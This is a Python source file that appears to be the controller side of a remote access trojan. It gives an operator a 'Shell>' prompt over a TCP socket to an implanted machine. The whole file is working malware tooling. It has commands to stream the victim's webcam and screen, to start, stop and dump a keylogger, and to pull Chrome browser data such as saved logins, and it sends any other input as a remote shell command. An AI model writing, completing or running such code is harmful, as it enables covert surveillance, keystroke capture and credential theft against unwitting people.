import socket
import cv2
import pickle
import struct
import json

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.1.9", 80))
    return s.getsockname()[0]

def receive_video(client_socket):
    data = b""
    payload_size = struct.calcsize("Q")

    while True:
        while len(data) < payload_size:
            packet = client_socket.recv(4 * 1024)
            if not packet:
                return
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]

        while len(data) < msg_size:
            data += client_socket.recv(4 * 1024)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("Received Video", frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
def receive_large_data(client_socket):
    # Receive data length first
    data_length = struct.unpack("Q", client_socket.recv(8))[0]
    data = b""
    while len(data) < data_length:
        packet = client_socket.recv(4096)
        if not packet:
            raise ConnectionError("Connection lost during data reception.")
        data += packet
    return data.decode()

def main():
    host_ip = get_ip_address()
    port = 9999

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host_ip, port))
        while True:
            command = input("Shell> ").lower()
            if command == "exit":
                s.send(command.encode())
                break
            elif command in ["camera", "screen"]:
                s.send(command.encode())
                try:
                    receive_video(s)
                except Exception as e:
                    print(f"Connection error: {e}")
            elif command == 'start_keylog':
                s.send(command.encode())
            elif command == 'stop_keylog':
                s.send(command.encode())
            elif command == 'dump_keylog':
                s.send(command.encode())
                response = s.recv(1024).decode()
                print(response)
            elif command == "chrome":
                s.send(command.encode())
                try:
                    data = receive_large_data(s)
                    chrome_data = json.loads(data)
                    print(json.dumps(chrome_data, indent=4))
                except Exception as e:
                    print(f"Error receiving data: {e}")
            else:
                try:
                    s.send(command.encode())
                    response = s.recv(1024).decode()
                    print(response)
                except:
                    print("connect again")


if __name__ == "__main__":
    main()

